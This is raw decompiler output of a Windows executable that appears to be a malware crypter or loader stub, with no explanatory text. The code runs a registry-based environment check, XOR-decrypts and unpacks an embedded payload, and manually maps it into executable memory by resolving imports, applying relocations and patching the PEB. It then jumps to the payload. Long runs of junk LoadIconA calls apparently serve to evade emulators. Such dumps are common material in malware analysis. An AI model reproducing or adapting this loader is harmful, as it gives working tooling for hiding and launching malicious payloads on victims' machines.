/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401040(int, int, int);
// int __usercall start@<eax>(int@<ebx>, int@<edi>, int@<esi>, _DWORD *);
FARPROC __cdecl sub_401270(HMODULE hModule, LPCSTR lpProcName);
int __stdcall sub_401290(int);
int __cdecl sub_402650(int, int);
LPVOID __cdecl sub_4026C0(SIZE_T dwBytes);
int __cdecl sub_4026F0(int, _DWORD *);
__int64 __cdecl sub_402840(int);
unsigned int __cdecl sub_402870(char *, int, unsigned int);
int __cdecl sub_402970(int *, char *);

//-------------------------------------------------------------------------
// Data declarations

// extern LSTATUS (__stdcall *RegOpenKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HANDLE (__stdcall *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HICON (__stdcall *LoadIconA)(HINSTANCE hInstance, LPCSTR lpIconName);
_UNKNOWN loc_40122C; // weak
_DWORD dword_405000[146] =
{
  16464,
  21504,
  -1874269327,
  768,
  1221187,
  16776960,
  1187395,
  0,
  119596611,
  117912072,
  840738929,
  8390407,
  521971267,
  -1275064646,
  -1204589750,
  567102465,
  1937493527,
  1869770784,
  1836307492,
  1851876128,
  543607085,
  1914725730,
  1764935734,
  1329864814,
  1870628368,
  221144420,
  842443854,
  1162888199,
  22980163,
  -707461111,
  136374824,
  234938456,
  34843968,
  840433720,
  1214279,
  512,
  1225931,
  4096,
  119576131,
  70393473,
  102802511,
  838940801,
  844244804,
  852507909,
  -1758090427,
  2032946,
  842180163,
  70396934,
  135763014,
  839321394,
  11703883,
  103941120,
  -2130406294,
  45157,
  589345603,
  590482818,
  203330656,
  2019914798,
  1222199,
  120723036,
  839563202,
  843415820,
  7512133,
  1680760880,
  7590434,
  853803008,
  841135943,
  7635206,
  672961631,
  -1067450304,
  1919013997,
  805319267,
  747872369,
  64,
  508207729,
  824711218,
  898670705,
  1342648928,
  671454327,
  -2113457615,
  119592559,
  271726120,
  119576171,
  671560272,
  672502979,
  672346680,
  845272353,
  847776772,
  847422279,
  810583064,
  846956675,
  846299398,
  -1610209978,
  344065842,
  2013697145,
  1668246629,
  479306097,
  -2130234704,
  287348787,
  843204737,
  841491729,
  2083672658,
  -442764481,
  -922204789,
  -442764416,
  -1593250685,
  5375739,
  1726021577,
  269849811,
  269431500,
  270374027,
  269431476,
  270374127,
  269431484,
  270374023,
  269169344,
  1485715984,
  3523209,
  1343391299,
  -1655137123,
  851146354,
  -2079388668,
  1222375,
  -1576026063,
  -2078447930,
  152,
  1222651,
  -157151488,
  124168069,
  -1871442557,
  1712563715,
  846844549,
  -149902780,
  -2147483454,
  454726723,
  251933188,
  706450499,
  251998728,
  253400129,
  14844176,
  840345155,
  -165671160,
  706450562,
  551911488,
  11179574,
  260046848
}; // weak
CHAR SubKey[] = "SOFTWARE\\Classes\\.bmp"; // idb
CHAR ProcName[] = "UnmapViewOfFile"; // idb
CHAR ModuleName[] = "kernel32.dll"; // idb
CHAR aVirtualfree[] = "VirtualFree"; // idb
CHAR aKernel32Dll_1[] = "kernel32.dll"; // idb
CHAR aMapviewoffilee[] = "MapViewOfFileEx"; // idb
CHAR aKernel32Dll_2[] = "kernel32.dll"; // idb
int dword_4090CC = 0; // weak
int dword_4090D0 = 0; // weak
int dword_4090D4 = 0; // weak
LPVOID lpAddress = NULL; // idb
int dword_4090DC = 0; // weak
int dword_4090E0 = 0; // weak
int dword_4090E4 = 0; // weak
int dword_4090E8 = 0; // weak
int dword_4090EC = 0; // weak
int (*dword_4090F0)(void) = NULL; // weak


//----- (00401040) --------------------------------------------------------
int __cdecl sub_401040(int a1, int a2, int a3)
{
  int result; // eax
  int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i < a3; ++i )
  {
    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2);
    result = i + 1;
  }
  return result;
}

//----- (004010D0) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, _DWORD *a4)
{
  SIZE_T dwBytes; // [esp+Ch] [ebp-88h]
  unsigned int v6; // [esp+10h] [ebp-84h]
  HKEY phkResult; // [esp+14h] [ebp-80h] BYREF
  char *v8; // [esp+18h] [ebp-7Ch]
  char *ModuleHandleA; // [esp+1Ch] [ebp-78h]
  _DWORD *v10; // [esp+20h] [ebp-74h]
  unsigned int i; // [esp+90h] [ebp-4h]
  int savedregs; // [esp+94h] [ebp+0h] BYREF

  ModuleHandleA = (char *)GetModuleHandleA(0);
  if ( RegOpenKeyA(HKEY_LOCAL_MACHINE, SubKey, &phkResult) )
    return 1;
  v10 = a4;
  dword_4090E8 = (_WORD)a4 == 0;
  if ( !(_WORD)a4 )
    lpAddress = v10;
  v8 = (char *)dword_405000;
  v6 = dword_405000[0];
  dwBytes = dword_405000[1];
  for ( i = 0; i < v6; i += 8 )
    *(_DWORD *)&v8[i + 8] ^= 0x12A643u;
  dword_4090E4 = (int)sub_4026C0(dwBytes);
  sub_402870(v8 + 8, dword_4090E4, v6);
  dword_4090D4 = a2;
  dword_4090D0 = a3;
  dword_4090E0 = a1;
  i = (unsigned int)&loc_40122C;
  dword_4090EC = (int)NtCurrentTeb();
  dword_4090DC = (int)&savedregs;
  if ( dword_4090E8 )
    sub_4026F0(i - (_DWORD)v10, v10);
  else
    sub_4026F0(i - (_DWORD)ModuleHandleA, ModuleHandleA);
  sub_401290(dword_4090E4);
  return dword_4090F0();
}
// 405000: using guessed type _DWORD dword_405000[146];
// 4090D0: using guessed type int dword_4090D0;
// 4090D4: using guessed type int dword_4090D4;
// 4090DC: using guessed type int dword_4090DC;
// 4090E0: using guessed type int dword_4090E0;
// 4090E4: using guessed type int dword_4090E4;
// 4090E8: using guessed type int dword_4090E8;
// 4090EC: using guessed type int dword_4090EC;
// 4090F0: using guessed type int (*dword_4090F0)(void);

//----- (00401270) --------------------------------------------------------
FARPROC __cdecl sub_401270(HMODULE hModule, LPCSTR lpProcName)
{
  return GetProcAddress(hModule, lpProcName);
}

//----- (00401290) --------------------------------------------------------
int __stdcall sub_401290(int a1)
{
  HMODULE ModuleHandleA; // eax
  HMODULE v3; // eax
  FARPROC v4; // eax
  HMODULE v5; // eax
  const CHAR *j; // [esp+4h] [ebp-48h]
  _DWORD *v7; // [esp+Ch] [ebp-40h]
  char *v8; // [esp+10h] [ebp-3Ch]
  int v9; // [esp+14h] [ebp-38h]
  char *v10; // [esp+14h] [ebp-38h]
  BOOL (__stdcall *UnmapViewOfFile)(LPCVOID); // [esp+18h] [ebp-34h]
  int *v12; // [esp+1Ch] [ebp-30h]
  const CHAR *v13; // [esp+20h] [ebp-2Ch]
  unsigned int v14; // [esp+24h] [ebp-28h]
  _DWORD *v15; // [esp+28h] [ebp-24h]
  int *v16; // [esp+2Ch] [ebp-20h]
  const CHAR *k; // [esp+30h] [ebp-1Ch]
  HMODULE hModule; // [esp+34h] [ebp-18h]
  int v19; // [esp+38h] [ebp-14h]
  LPVOID (__stdcall *MapViewOfFileEx)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID); // [esp+3Ch] [ebp-10h]
  BOOL (__stdcall *VirtualFree)(LPVOID, SIZE_T, DWORD); // [esp+40h] [ebp-Ch]
  unsigned int i; // [esp+44h] [ebp-8h]
  unsigned int m; // [esp+44h] [ebp-8h]
  HANDLE hObject; // [esp+48h] [ebp-4h]

  ModuleHandleA = GetModuleHandleA(ModuleName);
  UnmapViewOfFile = (BOOL (__stdcall *)(LPCVOID))GetProcAddress(ModuleHandleA, ProcName);
  v9 = *(_DWORD *)(a1 + 60) + a1;
  v15 = (_DWORD *)(v9 + *(unsigned __int16 *)(v9 + 20) + 24);
  v13 = (const CHAR *)VirtualAlloc(0, *(_DWORD *)(v9 + 80), 0x3000u, 0x40u);
  if ( !v13 )
    return 0;
  v3 = GetModuleHandleA(aKernel32Dll_1);
  VirtualFree = (BOOL (__stdcall *)(LPVOID, SIZE_T, DWORD))GetProcAddress(v3, aVirtualfree);
  sub_401040((int)v13, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v9 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v9 + 6); ++i )
  {
    if ( v15[5] )
    {
      if ( v15[4] )
        sub_401040(
          (int)&v13[v15[3]],
          v15[5] + a1,
          *(_DWORD *)(v9 + 60) * ((unsigned int)(v15[4] + *(_DWORD *)(v9 + 60) - 1) / *(_DWORD *)(v9 + 60)));
    }
    v15 += 10;
  }
  v10 = (char *)&v13[*((_DWORD *)v13 + 15)];
  hObject = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, *((_DWORD *)v10 + 20), 0);
  if ( !hObject )
    return 0;
  for ( j = &v13[*((_DWORD *)v10 + 32)]; *((_DWORD *)j + 4); j += 20 )
  {
    hModule = LoadLibraryA(&v13[*((_DWORD *)j + 3)]);
    if ( *(_DWORD *)j )
    {
      v16 = (int *)&v13[*(_DWORD *)j];
      v12 = (int *)&v13[*((_DWORD *)j + 4)];
    }
    else
    {
      v16 = (int *)&v13[*((_DWORD *)j + 4)];
      v12 = (int *)&v13[*(_DWORD *)j];
    }
    v19 = 0;
    if ( *((_DWORD *)j + 4) && *(_DWORD *)j )
      v19 = 1;
    while ( *v16 )
    {
      if ( *v16 >= 0 )
        v4 = sub_401270(hModule, &v13[*v16 + 2]);
      else
        v4 = sub_401270(hModule, (LPCSTR)(*v16 & 0x7FFFFFFF));
      *v16 = (int)v4;
      if ( !*v16 )
        return 0;
      if ( v19 )
        *v12 = *v16;
      ++v16;
      ++v12;
    }
  }
  if ( dword_4090E8 )
  {
    v8 = (char *)lpAddress - *((_DWORD *)v10 + 13);
    if ( *((_DWORD *)v10 + 41) )
    {
      for ( k = &v13[*((_DWORD *)v10 + 40)]; *((_DWORD *)k + 1); k += *((_DWORD *)k + 1) )
      {
        v14 = (unsigned int)(*((_DWORD *)k + 1) - 8) >> 1;
        v7 = k + 8;
        for ( m = 0; m < v14; ++m )
        {
          if ( (int)*((unsigned __int16 *)v7 + m) >> 12 == 3 )
            *(_DWORD *)&v13[*(_DWORD *)k + (*((_WORD *)v7 + m) & 0xFFF)] += v8;
        }
      }
    }
  }
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  LoadIconA(0, (LPCSTR)0x7F00);
  v5 = GetModuleHandleA(aKernel32Dll_2);
  MapViewOfFileEx = (LPVOID (__stdcall *)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID))GetProcAddress(
                                                                                         v5,
                                                                                         aMapviewoffilee);
  if ( dword_4090E8 )
    dword_4090CC = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, lpAddress);
  else
    dword_4090CC = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, *((LPVOID *)v10 + 13));
  if ( !dword_4090CC )
  {
    if ( dword_4090E8 )
    {
      if ( !UnmapViewOfFile(lpAddress) && !VirtualFree(lpAddress, 0, 0x8000) )
        return 0;
    }
    else if ( !UnmapViewOfFile(*((LPCVOID *)v10 + 13)) && !VirtualFree(*((LPVOID *)v10 + 13), 0, 0x8000) )
    {
      return 0;
    }
    if ( dword_4090E8 )
      dword_4090CC = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, lpAddress);
    else
      dword_4090CC = (int)MapViewOfFileEx(hObject, 34, 0, 0, 0, *((LPVOID *)v10 + 13));
    if ( !dword_4090CC )
    {
      if ( dword_4090E8 )
        dword_4090CC = (int)VirtualAlloc(lpAddress, *((_DWORD *)v10 + 20), 0x3000u, 0x40u);
      else
        dword_4090CC = (int)VirtualAlloc(*((LPVOID *)v10 + 13), *((_DWORD *)v10 + 20), 0x3000u, 0x40u);
    }
  }
  CloseHandle(hObject);
  sub_401040(dword_4090CC, (int)v13, *((_DWORD *)v10 + 20));
  if ( dword_4090E8 )
    sub_402650((int)lpAddress, *((_DWORD *)v10 + 10) + dword_4090CC);
  else
    sub_402840(dword_4090CC);
  dword_4090F0 = (int (*)(void))(*((_DWORD *)v10 + 10) + dword_4090CC);
  *((_DWORD *)v10 + 10) = dword_4090F0;
  return 1;
}
// 4090CC: using guessed type int dword_4090CC;
// 4090E8: using guessed type int dword_4090E8;
// 4090F0: using guessed type int (*dword_4090F0)(void);

//----- (00402650) --------------------------------------------------------
int __cdecl sub_402650(int a1, int a2)
{
  _DWORD *v3; // [esp+4h] [ebp-8h]

  v3 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_4090EC + 48) + 12) + 12);
  do
  {
    if ( !v3 )
      return 0;
    if ( v3[6] == a1 )
    {
      v3[7] = a2;
      return 1;
    }
    v3 = (_DWORD *)*v3;
  }
  while ( v3 != *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_4090EC + 48) + 12) + 12) );
  return 0;
}
// 4090EC: using guessed type int dword_4090EC;

//----- (004026C0) --------------------------------------------------------
LPVOID __cdecl sub_4026C0(SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapAlloc(ProcessHeap, 0, dwBytes);
}

//----- (004026F0) --------------------------------------------------------
int __cdecl sub_4026F0(int a1, _DWORD *a2)
{
  _DWORD *v3; // [esp+4h] [ebp-1Ch]
  _DWORD *v4; // [esp+8h] [ebp-18h]
  int v5; // [esp+Ch] [ebp-14h]
  SIZE_T *v6; // [esp+10h] [ebp-10h]
  unsigned int v7; // [esp+14h] [ebp-Ch]
  _DWORD *i; // [esp+18h] [ebp-8h]
  unsigned int j; // [esp+1Ch] [ebp-4h]

  if ( dword_4090E8 )
    v3 = lpAddress;
  else
    v3 = a2;
  v6 = (_DWORD *)((char *)v3 + v3[15]);
  dword_4090CC = (int)VirtualAlloc(0, v6[20], 0x3000u, 0x40u);
  if ( dword_4090CC )
  {
    sub_401040(dword_4090CC, (int)v3, v6[20]);
    v5 = dword_4090CC - (_DWORD)v3;
    if ( v6[41] )
    {
      for ( i = (_DWORD *)((char *)v3 + v6[40]); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v7 = (unsigned int)(i[1] - 8) >> 1;
        v4 = i + 2;
        for ( j = 0; j < v7; ++j )
        {
          if ( (int)*((unsigned __int16 *)v4 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_4090CC + (*((_WORD *)v4 + j) & 0xFFF)) += v5;
        }
      }
    }
    __asm { jmp     edx }
  }
  return 2;
}
// 4090CC: using guessed type int dword_4090CC;
// 4090E8: using guessed type int dword_4090E8;

//----- (00402840) --------------------------------------------------------
__int64 __cdecl sub_402840(int a1)
{
  __int64 result; // rax

  result = *(unsigned int *)(dword_4090EC + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 4090EC: using guessed type int dword_4090EC;

